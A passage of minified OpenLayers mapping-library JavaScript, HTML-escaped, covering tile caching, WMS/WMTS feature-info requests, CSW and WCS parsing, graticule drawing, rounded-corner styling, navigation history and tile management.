b=a.tile,c=b.url;!b.layer.crossOriginKeyword&amp;&amp;(OpenLayers.ProxyHost&amp;&amp;0===c.indexOf(OpenLayers.ProxyHost))&amp;&amp;(c=OpenLayers.Control.CacheWrite.urlMap[c]);if(c=window.localStorage.getItem("olCache_"+c))b.url=c,"tileerror"===a.type&amp;&amp;b.setImgSrc(c)}},destroy:function(){if(this.layers||this.map){var a,b=this.layers||this.map.layers;for(a=b.length-1;0&lt;=a;--a)this.removeLayer({layer:b[a]})}this.map&amp;&amp; this.map.events.un({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},CLASS_NAME:"OpenLayers.Control.CacheRead"});OpenLayers.Protocol.WFS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,{version:"1.0.0",CLASS_NAME:"OpenLayers.Protocol.WFS.v1_0_0"});OpenLayers.Format.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Format.XML,{layerIdentifier:"_layer",featureIdentifier:"_feature",regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},gmlFormat:null,read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a.documentElement;if(b){var c=this["read_"+b.nodeName];a=c?c.call(this,b):(new OpenLayers.Format.GML(this.options?this.options:{})).read(a)}return a},read_msGMLOutput:function(a){var b= [];if(a=this.getSiblingNodesByTagCriteria(a,this.layerIdentifier))for(var c=0,d=a.length;c&lt;d;++c){var e=a[c],f=e.nodeName;e.prefix&amp;&amp;(f=f.split(":")[1]);f=f.replace(this.layerIdentifier,"");if(e=this.getSiblingNodesByTagCriteria(e,this.featureIdentifier))for(var g=0;g&lt;e.length;g++){var h=e[g],k=this.parseGeometry(h),h=this.parseAttributes(h),h=new OpenLayers.Feature.Vector(k.geometry,h,null);h.bounds=k.bounds;h.type=f;b.push(h)}}return b},read_FeatureInfoResponse:function(a){var b=[];a=this.getElementsByTagNameNS(a, "*","FIELDS");for(var c=0,d=a.length;c&lt;d;c++){var e=a[c],f={},g,h=e.attributes.length;if(0&lt;h)for(g=0;g&lt;h;g++){var k=e.attributes[g];f[k.nodeName]=k.nodeValue}else for(e=e.childNodes,g=0,h=e.length;g&lt;h;++g)k=e[g],3!=k.nodeType&amp;&amp;(f[k.getAttribute("name")]=k.getAttribute("value"));b.push(new OpenLayers.Feature.Vector(null,f,null))}return b},getSiblingNodesByTagCriteria:function(a,b){var c=[],d,e,f,g;if(a&amp;&amp;a.hasChildNodes()){d=a.childNodes;f=d.length;for(var h=0;h&lt;f;h++){for(g=d[h];g&amp;&amp;1!=g.nodeType;)g= g.nextSibling,h++;e=g?g.nodeName:"";0&lt;e.length&amp;&amp;-1&lt;e.indexOf(b)?c.push(g):(e=this.getSiblingNodesByTagCriteria(g,b),0&lt;e.length&amp;&amp;(0==c.length?c=e:c.push(e)))}}return c},parseAttributes:function(a){var b={};if(1==a.nodeType){a=a.childNodes;for(var c=a.length,d=0;d&lt;c;++d){var e=a[d];if(1==e.nodeType){var f=e.childNodes,e=e.prefix?e.nodeName.split(":")[1]:e.nodeName;0==f.length?b[e]=null:1==f.length&amp;&amp;(f=f[0],3==f.nodeType||4==f.nodeType)&amp;&amp;(f=f.nodeValue.replace(this.regExes.trimSpace,""),b[e]=f)}}}return b}, parseGeometry:function(a){this.gmlFormat||(this.gmlFormat=new OpenLayers.Format.GML);a=this.gmlFormat.parseFeature(a);var b,c=null;a&amp;&amp;(b=a.geometry&amp;&amp;a.geometry.clone(),c=a.bounds&amp;&amp;a.bounds.clone(),a.destroy());return{geometry:b,bounds:c}},CLASS_NAME:"OpenLayers.Format.WMSGetFeatureInfo"});OpenLayers.Control.WMTSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,{hover:!1,requestEncoding:"KVP",drillDown:!1,maxFeatures:10,clickCallback:"click",layers:null,queryVisible:!0,infoFormat:"text/html",vendorParams:{},format:null,formatOptions:null,handler:null,hoverRequest:null,pending:0,initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions)); !0===this.drillDown&amp;&amp;(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.getInfoForHover},OpenLayers.Util.extend(this.handlerOptions.hover||{},{delay:250})):(a={},a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||{}))},getInfoForClick:function(a){this.request(a.xy,{})},getInfoForHover:function(a){this.request(a.xy,{hover:!0})},cancelHover:function(){this.hoverRequest&amp;&amp;(--this.pending, 0>=this.pending&amp;&amp;(OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"),this.pending=0),this.hoverRequest.abort(),this.hoverRequest=null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0&lt;=d&amp;&amp;(c=a[d],!(c instanceof OpenLayers.Layer.WMTS)||(c.requestEncoding!==this.requestEncoding||this.queryVisible&amp;&amp;!c.getVisibility())||(b.push(c),this.drillDown&amp;&amp;!this.hover));--d);return b},buildRequestOptions:function(a,b){var c=this.map.getLonLatFromPixel(b),d=a.getURL(new OpenLayers.Bounds(c.lon, c.lat,c.lon,c.lat)),d=OpenLayers.Util.getParameters(d),c=a.getTileInfo(c);OpenLayers.Util.extend(d,{service:"WMTS",version:a.version,request:"GetFeatureInfo",infoFormat:this.infoFormat,i:c.i,j:c.j});OpenLayers.Util.applyDefaults(d,this.vendorParams);return{url:OpenLayers.Util.isArray(a.url)?a.url[0]:a.url,params:OpenLayers.Util.upperCaseObject(d),callback:function(c){this.handleResponse(b,c,a)},scope:this}},request:function(a,b){b=b||{};var c=this.findLayers();if(0&lt;c.length){for(var d,e,f=0,g=c.length;f&lt; g;f++)e=c[f],d=this.events.triggerEvent("beforegetfeatureinfo",{xy:a,layer:e}),!1!==d&amp;&amp;(++this.pending,d=this.buildRequestOptions(e,a),d=OpenLayers.Request.GET(d),!0===b.hover&amp;&amp;(this.hoverRequest=d));0&lt;this.pending&amp;&amp;OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait")}},handleResponse:function(a,b,c){--this.pending;0>=this.pending&amp;&amp;(OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"),this.pending=0);if(b.status&amp;&amp;(200>b.status||300&lt;=b.status))this.events.triggerEvent("exception", {xy:a,request:b,layer:c});else{var d=b.responseXML;d&amp;&amp;d.documentElement||(d=b.responseText);var e,f;try{e=this.format.read(d)}catch(g){f=!0,this.events.triggerEvent("exception",{xy:a,request:b,error:g,layer:c})}f||this.events.triggerEvent("getfeatureinfo",{text:b.responseText,features:e,request:b,xy:a,layer:c})}},CLASS_NAME:"OpenLayers.Control.WMTSGetFeatureInfo"});OpenLayers.Protocol.CSW.v2_0_2=OpenLayers.Class(OpenLayers.Protocol,{formatOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.CSWGetRecords.v2_0_2(OpenLayers.Util.extend({},this.formatOptions)))},destroy:function(){this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a, this.options||{});var b=new OpenLayers.Protocol.Response({requestType:"read"}),c=this.format.write(a.params||a);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c});return b},handleRead:function(a,b){if(b.callback){var c=a.priv;200&lt;=c.status&amp;&amp;300>c.status?(a.data=this.parseData(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)}},parseData:function(a){var b= a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},CLASS_NAME:"OpenLayers.Protocol.CSW.v2_0_2"});OpenLayers.Format.WCSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,{namespaces:{wcs:"http://www.opengis.net/wcs/1.1",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows/1.1"},errorProperty:"operationsMetadata",readers:{wcs:OpenLayers.Util.applyDefaults({Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,b){b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)},CoverageSummary:function(a, b){var c={};this.readChildNodes(a,c);b.push(c)},Identifier:function(a,b){b.identifier=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b["abstract"]=this.getChildValue(a)},SupportedCRS:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.supportedCRS||(b.supportedCRS=[]),b.supportedCRS.push(c))},SupportedFormat:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.supportedFormat||(b.supportedFormat=[]),b.supportedFormat.push(c))}},OpenLayers.Format.WCSCapabilities.v1.prototype.readers.wcs), ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1_1_0"});OpenLayers.Control.Graticule=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,intervals:[45,30,20,10,5,2,1,0.5,0.2,0.1,0.05,0.01,0.005,0.002,0.001],displayInLayerSwitcher:!0,visible:!0,numPoints:50,targetSize:200,layerName:null,labelled:!0,labelFormat:"dm",lineSymbolizer:{strokeColor:"#333",strokeWidth:1,strokeOpacity:0.5},labelSymbolizer:{},gratLayer:null,initialize:function(a){a=a||{};a.layerName=a.layerName||OpenLayers.i18n("Graticule");OpenLayers.Control.prototype.initialize.apply(this,[a]); this.labelSymbolizer.stroke=!1;this.labelSymbolizer.fill=!1;this.labelSymbolizer.label="${label}";this.labelSymbolizer.labelAlign="${labelAlign}";this.labelSymbolizer.labelXOffset="${xOffset}";this.labelSymbolizer.labelYOffset="${yOffset}"},destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments);this.gratLayer&amp;&amp;(this.gratLayer.destroy(),this.gratLayer=null)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);if(!this.gratLayer){var a=new OpenLayers.Style({}, {rules:[new OpenLayers.Rule({symbolizer:{Point:this.labelSymbolizer,Line:this.lineSymbolizer}})]});this.gratLayer=new OpenLayers.Layer.Vector(this.layerName,{styleMap:new OpenLayers.StyleMap({"default":a}),visibility:this.visible,displayInLayerSwitcher:this.displayInLayerSwitcher})}return this.div},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.addLayer(this.gratLayer),this.map.events.register("moveend",this,this.update),this.update(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this, arguments)?(this.map.events.unregister("moveend",this,this.update),this.map.removeLayer(this.gratLayer),!0):!1},update:function(){var a=this.map.getExtent();if(a){this.gratLayer.destroyFeatures();var b=new OpenLayers.Projection("EPSG:4326"),c=this.map.getProjectionObject(),d=this.map.getResolution();c.proj&amp;&amp;"longlat"==c.proj.projName&amp;&amp;(this.numPoints=1);var e=this.map.getCenter(),f=new OpenLayers.Pixel(e.lon,e.lat);OpenLayers.Projection.transform(f,c,b);for(var e=this.targetSize*d,e=e*e,g,d=0;d&lt;this.intervals.length;++d){g= this.intervals[d];var h=g/2,k=f.offset({x:-h,y:-h}),h=f.offset({x:h,y:h});OpenLayers.Projection.transform(k,b,c);OpenLayers.Projection.transform(h,b,c);if((k.x-h.x)*(k.x-h.x)+(k.y-h.y)*(k.y-h.y)&lt;=e)break}f.x=Math.floor(f.x/g)*g;f.y=Math.floor(f.y/g)*g;var d=0,e=[f.clone()],h=f.clone(),l;do h=h.offset({x:0,y:g}),l=OpenLayers.Projection.transform(h.clone(),b,c),e.unshift(h);while(a.containsPixel(l)&amp;&amp;1E3>++d);h=f.clone();do h=h.offset({x:0,y:-g}),l=OpenLayers.Projection.transform(h.clone(),b,c),e.push(h); while(a.containsPixel(l)&amp;&amp;1E3>++d);d=0;k=[f.clone()];h=f.clone();do h=h.offset({x:-g,y:0}),l=OpenLayers.Projection.transform(h.clone(),b,c),k.unshift(h);while(a.containsPixel(l)&amp;&amp;1E3>++d);h=f.clone();do h=h.offset({x:g,y:0}),l=OpenLayers.Projection.transform(h.clone(),b,c),k.push(h);while(a.containsPixel(l)&amp;&amp;1E3>++d);g=[];for(d=0;d&lt;k.length;++d){l=k[d].x;for(var f=[],m=null,n=Math.min(e[0].y,90),h=Math.max(e[e.length-1].y,-90),p=(n-h)/this.numPoints,n=h,h=0;h&lt;=this.numPoints;++h){var q=new OpenLayers.Geometry.Point(l, n);q.transform(b,c);f.push(q);n+=p;q.y>=a.bottom&amp;&amp;!m&amp;&amp;(m=q)}this.labelled&amp;&amp;(m=new OpenLayers.Geometry.Point(m.x,a.bottom),l={value:l,label:this.labelled?OpenLayers.Util.getFormattedLonLat(l,"lon",this.labelFormat):"",labelAlign:"cb",xOffset:0,yOffset:2},this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))}for(h=0;h&lt;e.length;++h)if(n=e[h].y,!(-90>n||90&lt;n)){f=[];d=k[0].x;p=(k[k.length-1].x-d)/this.numPoints; l=d;m=null;for(d=0;d&lt;=this.numPoints;++d)q=new OpenLayers.Geometry.Point(l,n),q.transform(b,c),f.push(q),l+=p,q.x&lt;a.right&amp;&amp;(m=q);this.labelled&amp;&amp;(m=new OpenLayers.Geometry.Point(a.right,m.y),l={value:n,label:this.labelled?OpenLayers.Util.getFormattedLonLat(n,"lat",this.labelFormat):"",labelAlign:"rb",xOffset:-2,yOffset:2},this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))}this.gratLayer.addFeatures(g)}},CLASS_NAME:"OpenLayers.Control.Graticule"});OpenLayers.Console.warn("OpenLayers.Rico is deprecated");OpenLayers.Rico=OpenLayers.Rico||{}; OpenLayers.Rico.Corner={round:function(a,b){a=OpenLayers.Util.getElement(a);this._setOptions(b);var c=this.options.color;"fromElement"==this.options.color&amp;&amp;(c=this._background(a));var d=this.options.bgColor;"fromParent"==this.options.bgColor&amp;&amp;(d=this._background(a.offsetParent));this._roundCornersImpl(a,c,d)},changeColor:function(a,b){a.style.backgroundColor=b;for(var c=a.parentNode.getElementsByTagName("span"),d=0;d&lt;c.length;d++)c[d].style.backgroundColor=b},changeOpacity:function(a,b){var c="alpha(opacity="+ 100*b+")";a.style.opacity=b;a.style.filter=c;for(var d=a.parentNode.getElementsByTagName("span"),e=0;e&lt;d.length;e++)d[e].style.opacity=b,d[e].style.filter=c},reRound:function(a,b){var c=a.parentNode.childNodes[2];a.parentNode.removeChild(a.parentNode.childNodes[0]);a.parentNode.removeChild(c);this.round(a.parentNode,b)},_roundCornersImpl:function(a,b,c){this.options.border&amp;&amp;this._renderBorder(a,c);this._isTopRounded()&amp;&amp;this._roundTopCorners(a,b,c);this._isBottomRounded()&amp;&amp;this._roundBottomCorners(a, b,c)},_renderBorder:function(a,b){var c="1px solid "+this._borderColor(b);a.innerHTML="&lt;div "+("style='border-left: "+c+";"+("border-right: "+c)+"'")+">"+a.innerHTML+"&lt;/div>"},_roundTopCorners:function(a,b,c){for(var d=this._createCorner(c),e=0;e&lt;this.options.numSlices;e++)d.appendChild(this._createCornerSlice(b,c,e,"top"));a.style.paddingTop=0;a.insertBefore(d,a.firstChild)},_roundBottomCorners:function(a,b,c){for(var d=this._createCorner(c),e=this.options.numSlices-1;0&lt;=e;e--)d.appendChild(this._createCornerSlice(b, c,e,"bottom"));a.style.paddingBottom=0;a.appendChild(d)},_createCorner:function(a){var b=document.createElement("div");b.style.backgroundColor=this._isTransparent()?"transparent":a;return b},_createCornerSlice:function(a,b,c,d){var e=document.createElement("span"),f=e.style;f.backgroundColor=a;f.display="block";f.height="1px";f.overflow="hidden";f.fontSize="1px";a=this._borderColor(a,b);this.options.border&amp;&amp;0==c?(f.borderTopStyle="solid",f.borderTopWidth="1px",f.borderLeftWidth="0px",f.borderRightWidth= "0px",f.borderBottomWidth="0px",f.height="0px",f.borderColor=a):a&amp;&amp;(f.borderColor=a,f.borderStyle="solid",f.borderWidth="0px 1px");this.options.compact||c!=this.options.numSlices-1||(f.height="2px");this._setMargin(e,c,d);this._setBorder(e,c,d);return e},_setOptions:function(a){this.options={corners:"all",color:"fromElement",bgColor:"fromParent",blend:!0,border:!1,compact:!1};OpenLayers.Util.extend(this.options,a||{});this.options.numSlices=this.options.compact?2:4;this._isTransparent()&amp;&amp;(this.options.blend= !1)},_whichSideTop:function(){return this._hasString(this.options.corners,"all","top")||0&lt;=this.options.corners.indexOf("tl")&amp;&amp;0&lt;=this.options.corners.indexOf("tr")?"":0&lt;=this.options.corners.indexOf("tl")?"left":0&lt;=this.options.corners.indexOf("tr")?"right":""},_whichSideBottom:function(){return this._hasString(this.options.corners,"all","bottom")||0&lt;=this.options.corners.indexOf("bl")&amp;&amp;0&lt;=this.options.corners.indexOf("br")?"":0&lt;=this.options.corners.indexOf("bl")?"left":0&lt;=this.options.corners.indexOf("br")? "right":""},_borderColor:function(a,b){return"transparent"==a?b:this.options.border?this.options.border:this.options.blend?this._blend(b,a):""},_setMargin:function(a,b,c){b=this._marginSize(b);c="top"==c?this._whichSideTop():this._whichSideBottom();"left"==c?(a.style.marginLeft=b+"px",a.style.marginRight="0px"):"right"==c?(a.style.marginRight=b+"px",a.style.marginLeft="0px"):(a.style.marginLeft=b+"px",a.style.marginRight=b+"px")},_setBorder:function(a,b,c){b=this._borderSize(b);c="top"==c?this._whichSideTop(): this._whichSideBottom();"left"==c?(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth="0px"):"right"==c?(a.style.borderRightWidth=b+"px",a.style.borderLeftWidth="0px"):(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth=b+"px");!1!=this.options.border&amp;&amp;(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth=b+"px")},_marginSize:function(a){if(this._isTransparent())return 0;var b=[5,3,2,1],c=[3,2,1,0],d=[2,1],e=[1,0];return this.options.compact&amp;&amp;this.options.blend?e[a]:this.options.compact? d[a]:this.options.blend?c[a]:b[a]},_borderSize:function(a){var b=[5,3,2,1],c=[2,1,1,1],d=[1,0],e=[0,2,0,0];return this.options.compact&amp;&amp;(this.options.blend||this._isTransparent())?1:this.options.compact?d[a]:this.options.blend?c[a]:this.options.border?e[a]:this._isTransparent()?b[a]:0},_hasString:function(a){for(var b=1;b&lt;arguments.length;b++)if(0&lt;=a.indexOf(arguments[b]))return!0;return!1},_blend:function(a,b){var c=OpenLayers.Rico.Color.createFromHex(a);c.blend(OpenLayers.Rico.Color.createFromHex(b)); return c},_background:function(a){try{return OpenLayers.Rico.Color.createColorFromBackground(a).asHex()}catch(b){return"#ffffff"}},_isTransparent:function(){return"transparent"==this.options.color},_isTopRounded:function(){return this._hasString(this.options.corners,"all","top","tl","tr")},_isBottomRounded:function(){return this._hasString(this.options.corners,"all","bottom","bl","br")},_hasSingleTextChild:function(a){return 1==a.childNodes.length&amp;&amp;3==a.childNodes[0].nodeType}};OpenLayers.Control.NavigationHistory=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOGGLE,previous:null,previousOptions:null,next:null,nextOptions:null,limit:50,autoActivate:!0,clearOnDeactivate:!1,registry:null,nextStack:null,previousStack:null,listeners:null,restoring:!1,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.registry=OpenLayers.Util.extend({moveend:this.getState},this.registry);a={trigger:OpenLayers.Function.bind(this.previousTrigger, this),displayClass:this.displayClass+" "+this.displayClass+"Previous"};OpenLayers.Util.extend(a,this.previousOptions);this.previous=new OpenLayers.Control.Button(a);a={trigger:OpenLayers.Function.bind(this.nextTrigger,this),displayClass:this.displayClass+" "+this.displayClass+"Next"};OpenLayers.Util.extend(a,this.nextOptions);this.next=new OpenLayers.Control.Button(a);this.clear()},onPreviousChange:function(a,b){a&amp;&amp;!this.previous.active?this.previous.activate():!a&amp;&amp;this.previous.active&amp;&amp;this.previous.deactivate()}, onNextChange:function(a,b){a&amp;&amp;!this.next.active?this.next.activate():!a&amp;&amp;this.next.active&amp;&amp;this.next.deactivate()},destroy:function(){OpenLayers.Control.prototype.destroy.apply(this);this.previous.destroy();this.next.destroy();this.deactivate();for(var a in this)this[a]=null},setMap:function(a){this.map=a;this.next.setMap(a);this.previous.setMap(a)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.next.draw();this.previous.draw()},previousTrigger:function(){var a=this.previousStack.shift(), b=this.previousStack.shift();void 0!=b?(this.nextStack.unshift(a),this.previousStack.unshift(b),this.restoring=!0,this.restore(b),this.restoring=!1,this.onNextChange(this.nextStack[0],this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1)):this.previousStack.unshift(a);return b},nextTrigger:function(){var a=this.nextStack.shift();void 0!=a&amp;&amp;(this.previousStack.unshift(a),this.restoring=!0,this.restore(a),this.restoring=!1,this.onNextChange(this.nextStack[0], this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1));return a},clear:function(){this.previousStack=[];this.previous.deactivate();this.nextStack=[];this.next.deactivate()},getState:function(){return{center:this.map.getCenter(),resolution:this.map.getResolution(),projection:this.map.getProjectionObject(),units:this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units}},restore:function(a){var b,c;if(this.map.getProjectionObject()== a.projection)c=this.map.getZoomForResolution(a.resolution),b=a.center;else{b=a.center.clone();b.transform(a.projection,this.map.getProjectionObject());c=a.units;var d=this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units;c=this.map.getZoomForResolution((c&amp;&amp;d?OpenLayers.INCHES_PER_UNIT[c]/OpenLayers.INCHES_PER_UNIT[d]:1)*a.resolution)}this.map.setCenter(b,c)},setListeners:function(){this.listeners={};for(var a in this.registry)this.listeners[a]=OpenLayers.Function.bind(function(){if(!this.restoring){var b= this.registry[a].apply(this,arguments);this.previousStack.unshift(b);if(1&lt;this.previousStack.length)this.onPreviousChange(this.previousStack[1],this.previousStack.length-1);this.previousStack.length>this.limit+1&amp;&amp;this.previousStack.pop();0&lt;this.nextStack.length&amp;&amp;(this.nextStack=[],this.onNextChange(null,0))}return!0},this)},activate:function(){var a=!1;if(this.map&amp;&amp;OpenLayers.Control.prototype.activate.apply(this)){null==this.listeners&amp;&amp;this.setListeners();for(var b in this.listeners)this.map.events.register(b, this,this.listeners[b]);a=!0;0==this.previousStack.length&amp;&amp;this.initStack()}return a},initStack:function(){this.map.getCenter()&amp;&amp;this.listeners.moveend()},deactivate:function(){var a=!1;if(this.map&amp;&amp;OpenLayers.Control.prototype.deactivate.apply(this)){for(var b in this.listeners)this.map.events.unregister(b,this,this.listeners[b]);this.clearOnDeactivate&amp;&amp;this.clear();a=!0}return a},CLASS_NAME:"OpenLayers.Control.NavigationHistory"});OpenLayers.Layer.UTFGrid=OpenLayers.Class(OpenLayers.Layer.XYZ,{isBaseLayer:!1,projection:new OpenLayers.Projection("EPSG:900913"),useJSONP:!1,tileClass:OpenLayers.Tile.UTFGrid,initialize:function(a){OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,{},a]);this.tileOptions=OpenLayers.Util.extend({utfgridResolution:this.utfgridResolution},this.tileOptions)},createBackBuffer:function(){},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.UTFGrid(this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a])},getFeatureInfo:function(a){var b=null;(a=this.getTileData(a))&amp;&amp;a.tile&amp;&amp;(b=a.tile.getFeatureInfo(a.i,a.j));return b},getFeatureId:function(a){var b=null;a=this.getTileData(a);a.tile&amp;&amp;(b=a.tile.getFeatureId(a.i,a.j));return b},CLASS_NAME:"OpenLayers.Layer.UTFGrid"});OpenLayers.TileManager=OpenLayers.Class({cacheSize:256,tilesPerFrame:2,frameDelay:16,moveDelay:100,zoomDelay:200,maps:null,tileQueueId:null,tileQueue:null,tileCache:null,tileCacheIndex:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.maps=[];this.tileQueueId={};this.tileQueue={};this.tileCache={};this.tileCacheIndex=[]},addMap:function(a){if(!this._destroyed&amp;&amp;OpenLayers.Layer.Grid){this.maps.push(a);this.tileQueue[a.id]=[];for(var b=0,c=a.layers.length;b&lt;c;++b)this.addLayer({layer:a.layers[b]}); a.events.on({move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this})}},removeMap:function(a){if(!this._destroyed&amp;&amp;OpenLayers.Layer.Grid){window.clearTimeout(this.tileQueueId[a.id]);if(a.layers)for(var b=0,c=a.layers.length;b&lt;c;++b)this.removeLayer({layer:a.layers[b]});a.events&amp;&amp;a.events.un({move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this}); delete this.tileQueue[a.id];delete this.tileQueueId[a.id];OpenLayers.Util.removeItem(this.maps,a)}},move:function(a){this.updateTimeout(a.object,this.moveDelay,!0)},zoomEnd:function(a){this.updateTimeout(a.object,this.zoomDelay)},changeLayer:function(a){"visibility"!==a.property&amp;&amp;"params"!==a.property||this.updateTimeout(a.object,0)},addLayer:function(a){a=a.layer;if(a instanceof OpenLayers.Layer.Grid){a.events.on({addtile:this.addTile,retile:this.clearTileQueue,scope:this});var b,c,d;for(b=a.grid.length- 1;0&lt;=b;--b)for(c=a.grid[b].length-1;0&lt;=c;--c)d=a.grid[b][c],this.addTile({tile:d}),d.url&amp;&amp;!d.imgDiv&amp;&amp;this.manageTileCache({object:d})}},removeLayer:function(a){a=a.layer;if(a instanceof OpenLayers.Layer.Grid&amp;&amp;(this.clearTileQueue({object:a}),a.events&amp;&amp;a.events.un({addtile:this.addTile,retile:this.clearTileQueue,scope:this}),a.grid)){var b,c,d;for(b=a.grid.length-1;0&lt;=b;--b)for(c=a.grid[b].length-1;0&lt;=c;--c)d=a.grid[b][c],this.unloadTile({object:d})}},updateTimeout:function(a,b,c){window.clearTimeout(this.tileQueueId[a.id]); var d=this.tileQueue[a.id];if(!c||d.length)this.tileQueueId[a.id]=window.setTimeout(OpenLayers.Function.bind(function(){this.drawTilesFromQueue(a);d.length&amp;&amp;this.updateTimeout(a,this.frameDelay)},this),b)},addTile:function(a){if(a.tile instanceof OpenLayers.Tile.Image)a.tile.events.on({beforedraw:this.queueTileDraw,beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this});else this.removeLayer({layer:a.tile.layer})},unloadTile:function(a){a=a.object;a.events.un({beforedraw:this.queueTileDraw, beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this});OpenLayers.Util.removeItem(this.tileQueue[a.layer.map.id],a)},queueTileDraw:function(a){a=a.object;var b=!1,c=a.layer,d=c.getURL(a.bounds),e=this.tileCache[d];e&amp;&amp;"olTileImage"!==e.className&amp;&amp;(delete this.tileCache[d],OpenLayers.Util.removeItem(this.tileCacheIndex,d),e=null);!c.url||!c.async&amp;&amp;e||(b=this.tileQueue[c.map.id],~OpenLayers.Util.indexOf(b,a)||b.push(a),b=!0);return!b},drawTilesFromQueue:function(a){var b= this.tileQueue[a.id],c=this.tilesPerFrame;for(a=a.zoomTween&amp;&amp;a.zoomTween.playing;!a&amp;&amp;b.length&amp;&amp;c;)b.shift().draw(!0),--c},manageTileCache:function(a){a=a.object;var b=this.tileCache[a.url];b&amp;&amp;(b.parentNode&amp;&amp;OpenLayers.Element.hasClass(b.parentNode,"olBackBuffer")&amp;&amp;(b.parentNode.removeChild(b),b.id=null),b.parentNode||(b.style.visibility="hidden",b.style.opacity=0,a.setImage(b),OpenLayers.Util.removeItem(this.tileCacheIndex,a.url),this.tileCacheIndex.push(a.url)))},addToCache:function(a){a=a.object; this.tileCache[a.url]||OpenLayers.Element.hasClass(a.imgDiv,"olImageLoadError")||(this.tileCacheIndex.length>=this.cacheSize&amp;&amp;(delete this.tileCache[this.tileCacheIndex[0]],this.tileCacheIndex.shift()),this.tileCache[a.url]=a.imgDiv,this.tileCacheIndex.push(a.url))},clearTileQueue:function(a){a=a.object;for(var b=this.tileQueue[a.map.id],c=b.length-1;0&lt;=c;--c)b[c].layer===a&amp;&amp;b.splice(c,1)},destroy:function(){for(var a=this.maps.length-1;0&lt;=a;--a)this.removeMap(this.maps[a]);this.tileCacheIndex=this.tileCache= this.tileQueueId=this.tileQueue=this.maps=null;this._destroyed=!0}});OpenLayers.Layer.ArcGISCache=OpenLayers.Class(OpenLayers.Layer.XYZ,{url:null,tileOrigin:null,tileSize:new OpenLayers.Size(256,256),useArcGISServer:!0,type:"png",useScales:!1,overrideDPI:!1,initialize:function(a,b,c){OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.resolutions&amp;&amp;(this.serverResolutions=this.resolutions,this.maxExtent=this.getMaxExtentForResolution(this.resolutions[0]));if(this.layerInfo){var d=this.layerInfo,e=new OpenLayers.Bounds(d.fullExtent.xmin,d.fullExtent.ymin, 